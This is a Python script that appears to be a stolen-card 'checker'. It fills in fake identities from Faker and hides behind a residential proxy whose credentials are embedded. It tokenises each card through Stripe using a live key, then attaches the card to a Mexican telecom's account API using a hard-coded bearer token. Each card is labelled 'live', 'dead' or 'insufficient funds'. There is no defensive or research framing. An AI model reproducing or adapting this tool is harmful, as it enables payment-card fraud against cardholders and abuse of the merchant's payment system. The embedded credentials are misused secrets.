from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
from anticaptchaofficial.recaptchav2proxyless import *
import time
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password

async def process_card(card: str) -> str:    
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
             proxy_user = "package-312813-country-mx-isp-telmex+fibra-sessionid-eTaAqoPhOtCDMWTu-sessionlength-300"
            proxy_pass = "6jSQIr9PqBGQhum4"
            proxy_host = "proxy.soax.com"
            proxy_port = 5000

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            c.proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            numeros_disponibles = [
                "5642755407", "5635121149", "5635121165", "5586396881", "5642380032", "5642378421"
            ]
            elegido = random.choice(numeros_disponibles)
            print(elegido)
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': elegido,
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan_services/validate', params=params, headers=headers)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['altan_service']['id']
            print(id_servicio)
            time.sleep(2)
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'segment_id': '1',
                'altanServiceId': '109896',
                'publicly_available': 'true',
                'service_type': 'mbb',
                'interface_mask': '128',
                'altan_speed_limit': 'best_effort',
                'service_offer_type': 'primary',
                'offering_type': 'top_up',
                'is_multiple_activation': 'true',
            }

            response = c.get('https://redphone.api.koonolmexico.com/offerings', params=params, headers=headers)
            time.sleep(2)

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/116.0.0.0 Safari/537.36'
                ),
            }

            data = (
                'time_on_page=259834'
                '&pasted_fields=number'
                '&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5'
                '&muid=d51c4248-1542-438c-a89e-99aa38930d3670a15d'
                '&sid=25c34fde-e457-4fb4-bcfc-a35c038a4cc5546441'
                '&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC'
                '&payment_user_agent=stripe.js%2F78ef418'
                f'&card[number]={cc_number}'
                f'&card[cvc]={cvv}'
                f'&card[exp_month]={mes}'
                f'&card[exp_year]={ano_number}'
            )

            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            tokenst = responsePm['id']
            print(tokenst)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'payment_card[card_name]': name+last,
                'payment_card[card_number]': cc_number,
                'payment_card[cvv]': cvv,
                'payment_card[expiry_month]': mes,
                'payment_card[expiry_year]': ano_number,
                'payment_card[is_default]': 'false',
                'payment_card[stripe_token]': tokenst,
                'user_id': id_servicio,
            }

            response = requests.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, data=data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            #print(responsePm)

            # Variables por defecto
            # Variables por defecto
            status = "error"
            mensaje = ""

            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                error_code = error_info.get('code', '').lower()
                error_message = error_info.get('message', 'Error desconocido')

                if error_code == 'card_declined':
                    mensaje = f"Tarjeta rechazada: {error_message}"
                    status = "dead"

                elif error_code == 'insufficient_funds':
                    mensaje = f"Fondos insuficientes: {error_message}"
                    status = "insufficient_funds"

                else:
                    mensaje = f"Error: {error_message}"
                    status = "error"

            elif 'altan_service_bundle_order' in responsePm:
                st = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if st in ['delivered', 'authorized']:
                    mensaje = "Aprobado"
                    status = "live"
                else:
                    mensaje = f"Estado: {st}"
                    status = "error"

            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                fecha = responsePm['payment_card']['created_at']
                mensaje = f"Aprobado (Registrada) - Fecha: {fecha}"
                status = "live"

            else:
                mensaje = "Respuesta no reconocida"
                status = "error"

            print(f"{status.upper()}: {mensaje}")

            # <-- Aquí agregas la tarjeta al return -->
            return {"status": status, "message": mensaje, "cc": card}


        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}




